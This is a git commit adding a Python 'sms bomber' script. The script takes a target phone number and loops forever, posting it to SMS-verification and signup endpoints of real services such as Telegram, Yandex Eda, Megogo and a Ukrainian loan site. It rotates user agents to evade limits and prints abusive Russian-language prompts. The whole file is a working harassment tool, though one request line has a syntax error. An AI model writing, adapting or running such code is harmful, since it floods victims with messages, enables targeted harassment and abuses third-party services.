7a76bb78c45390acf9410ee12b737338053743d7
knstnt1 <93650632+knstnt1@users.noreply.github.com>
2021-11-03 12:31:53 +0200

    zxc

---
+++ main.py
@@ -0,0 +1,79 @@
+from user_agent import generate_user_agent
+import requests
+
+print(r"""
+sms bomber
+ by knstnt                                                                                            
+""")
+
+password = str('Drg3ff3w3fhsd4')
+mail = str('sobal52097@bio123.net')
+last_name = str('Анна')
+first_name = str('Моритория')
+middle_name = str('Агаева')
+good = str('ТУДА ШАЛАВУ')
+bad = str('пиздец какой-то')
+
+
+print('КОГО ЕБАШИМ? (380XXXXXXXXX)')
+phone = input()
+phone_plus = '+' + str(phone)
+cut_phone = str(phone[3:12])
+def run():
+    while True:
+        head = {'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
+    
+        try:
+            response = requests.post('https://megogo.net/ua/auth_login'), json ={'phone': password}, headers = head)
+            print('MEGOGO: ' + good)
+        except Exception:
+            print(bad)
+        
+        try:
+            response = requests.post('https://auth.multiplex.ua/login', json = {'login': phone}, headers = head)
+            print('Multiplex: ' + good)
+        except Exception:
+            print(bad)
+        
+        try:
+            response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': phone_plus}, headers = head)
+            print('Yandex eda: ' + good)
+        except Exception:
+            print(bad)
+        
+        try:
+            response = requests.post('https://md-fashion.com.ua/bpm/validate-contact', data = {'phone': phone_plus}, headers = head)
+            print('MD Fashion: ' + good)
+        except Exception:
+            print(bad)
+
+        try:
+            response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': phone_plus}, headers = head)
+            print('Telegram: ' + good)
+        except Exception:
+            print(bad)
+
+        try:
+            response = requests.post('https://my.xtra.tv/api/signup?lang=uk', data = {'phone': phone_plus}, headers = head)
+            print('XTRA TV: ' + good)
+        except Exception:
+            print(bad)
+        
+        try:
+            response = requests.get('https://findclone.ru/register', data = {'phone': phone}, headers = head)
+            print('FindClone: ' + good)
+        except Exception:
+            print(bad)
+
+        try:
+            response = requests.post('https://credit7.ua/client/registration/general-information', data = {'last_name:': last_name, 'first_name': first_name, 'middle_name': middle_name, 'mobile_phone': phone_plus}, headers = head)
+            print('Credit7: ' + good)
+        except Exception:
+            print(bad)
+
+        try:
+            response = requests.post('https://www.iqos.com.ua/index.php?dispatch=sms_validation.send_code', data = {'phone_number': phone_plus, 'is_ajax': '1'}, headers = head)
+            print('IQOS: ' + good)
+        except Exception:
+            print(bad)
+run()
